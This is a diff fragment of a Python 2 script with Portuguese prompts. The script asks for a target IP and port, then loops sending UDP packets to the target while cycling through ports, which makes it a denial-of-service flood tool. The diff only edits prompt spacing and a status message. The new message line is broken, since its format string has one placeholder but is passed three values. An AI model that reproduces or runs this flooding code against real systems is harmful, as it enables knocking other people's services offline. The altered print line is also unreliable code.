@@ -73,7 +73,7 @@ d88   888  888    888 d88   888    888    888 888     888     "Y88b.
 '''
 
 ip = raw_input("IP Alvo : ")
-port = input("Porta padrao 80     : ")
+port = input("Porta padrao 80   : ")
 
 os.system("clear")
 print '''
@@ -112,6 +112,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[91m[+]\033[0m \033[94msent attack by 404\033[0m"
+     print "\033[91m[+]\033[0m \033[94mataque by 404 port:%s\033[0m"%(sent,ip,port)
      if port == 65534:
        port = 1
